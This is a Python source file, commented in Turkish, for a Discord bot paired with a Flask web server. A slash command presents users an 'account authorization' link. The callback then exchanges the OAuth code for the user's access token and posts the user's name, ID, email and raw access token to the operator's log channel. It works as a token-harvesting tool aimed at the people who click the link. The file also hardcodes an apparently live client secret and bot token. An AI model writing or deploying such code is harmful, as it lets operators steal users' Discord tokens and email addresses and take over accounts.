import threading
import asyncio
from flask import Flask, redirect, request
import requests
import discord
from discord import app_commands
from discord.ext import commands

# --- AYARLAR ---
CLIENT_ID = "1537176213678719037"
CLIENT_SECRET = "_cepqD6WCRm5KI-s5ydlzcFv_vhZi5kn"
REDIRECT_URI = "http://localhost:5000/callback"

BOT_TOKEN = "MTUzNzE3NjIxMzY3ODcxOTAzNw.GrCh8N.kpdLEQjJdz5gbYn1AgA3ck5WeTe2YqXX-10H1I"
LOG_CHANNEL_ID = 1537178229570535585

app = Flask(__name__)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
  await bot.tree.sync()
  print(f"[+] Bot aktif: {bot.user}")


# 1. Kullanıcıya yetkilendirme linkini gönderen komut
@bot.tree.command(name="ero1", description="Hesap yetkilendirme panelini açar.")
async def ero1(interaction: discord.Interaction):
  # Discord OAuth2 izin kapsamları (identify, email, guilds vb.)
  auth_url = (
      f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}"
      f"&redirect_uri={REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')}"
      "&response_type=code&scope=identify%20email%20guilds"
  )

  embed = discord.Embed(
      title="🔑 Discord Hesap Yetkilendirmesi",
      description=(
          "İşleme devam etmek için [buraya tıklayarak]"
          f"({auth_url}) hesabına izin vermelisin."
      ),
      color=discord.Color.blue(),
  )
  await interaction.response.send_message(embed=embed, ephemeral=True)


# 2. Web Sunucusu: Kullanıcı izin verince bilgileri ve token'ı kutu içine alıp log kanalına yazar
@app.route("/callback")
def callback():
  code = request.args.get("code")
  if not code:
    return "Yetkilendirme iptal edildi."

  # Token değişimi
  data = {
      "client_id": CLIENT_ID,
      "client_secret": CLIENT_SECRET,
      "grant_type": "authorization_code",
      "code": code,
      "redirect_uri": REDIRECT_URI,
  }
  headers = {"Content-Type": "application/x-www-form-urlencoded"}

  response = requests.post(
      "https://discord.com/api/oauth2/token", data=data, headers=headers
  )
  json_res = response.json()
  access_token = json_res.get("access_token")

  if not access_token:
    return f"Yetki kodu alınamadı: {json_res}"

  # Kullanıcı profil bilgilerini çek
  user_headers = {"Authorization": f"Bearer {access_token}"}
  user_info = requests.get(
      "https://discord.com/api/users/@me", headers=user_headers
  ).json()

  username = user_info.get("username")
  user_id = user_info.get("id")
  email = user_info.get("email", "Paylaşılmadı")
  verified = user_info.get("verified", False)

  # Bilgileri ve Access Token'ı Discord'daki log kanalına şık bir kutu (Embed) içinde gönder
  channel = bot.get_channel(LOG_CHANNEL_ID)
  if channel:
    embed = discord.Embed(
        title="📥 Yeni Kullanıcı Yetkilendirmesi",
        color=discord.Color.green(),
    )
    embed.add_field(name="Kullanıcı Adı", value=username, inline=True)
    embed.add_field(name="Kullanıcı ID", value=f"`{user_id}`", inline=True)
    embed.add_field(name="E-posta", value=email, inline=False)
    embed.add_field(name="Doğrulanmış mı?", value=str(verified), inline=True)
    embed.add_field(
        name="Access Token", value=f"```json\n{access_token}\n```", inline=False
    )

    fut = asyncio.run_coroutine_threadsafe(
        channel.send(embed=embed),
        bot.loop,
    )
    fut.result()

  return "<h3>Yetkilendirme Başarılı!</h3>Pencereyi kapatabilirsin."


if __name__ == "__main__":
  threading.Thread(
      target=lambda: app.run(port=5000, debug=False, use_reloader=False)
  ).start()
  bot.run(BOT_TOKEN)
